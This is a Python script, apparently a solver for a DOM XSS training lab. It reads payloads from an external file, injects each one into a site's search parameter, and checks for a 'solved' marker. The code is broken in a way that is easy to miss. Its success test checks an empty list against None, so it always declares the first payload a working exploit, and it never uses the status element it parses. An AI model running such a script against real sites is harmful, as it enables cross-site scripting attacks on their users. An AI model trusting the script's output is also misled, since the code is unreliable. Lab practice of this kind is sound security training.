# Lab: DOM XSS in document.write sink using source location.search

import requests
import sys
from bs4 import BeautifulSoup
# For deprecating the warnings
requests.packages.urllib3.disable_warnings()

# Determine proxy details to intercept the request within the burp proxy
# requests.proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip().rstrip('/')        
    except Exception:
        print("[-] Usage: %s <url> <post ID>" % sys.argv[0])
        print('[-] Example: %s www.example.com 1' % sys.argv[0])
        sys.exit(-1)


# read the payloads from the file
with open("payload.txt") as f:
    payload_list = f.read().splitlines()

# craft the attack
# establishing session for uniformity of request sequences
session = requests.session()
for exploit_payload in payload_list:
    attack_request = session.get(base_url + "/?search=%s" % exploit_payload)
    # now check whether problem got solved ???
    # is_solved = crafted_request.text
    is_solved = session.get(base_url)
    result = []
    soup = BeautifulSoup(is_solved.text, features="lxml")
    data = soup.find("div", {"class" : "widgetcontainer-lab-status is-solved"})

    if result is None:
        print("Not Solved! :( ")
        print("Trying out more payloads from the payload.txt file...")
        continue
    else:
        print("\nSolved!!! :) ")
        print("Working payload(exploit) is: %s" % exploit_payload)
        break
    
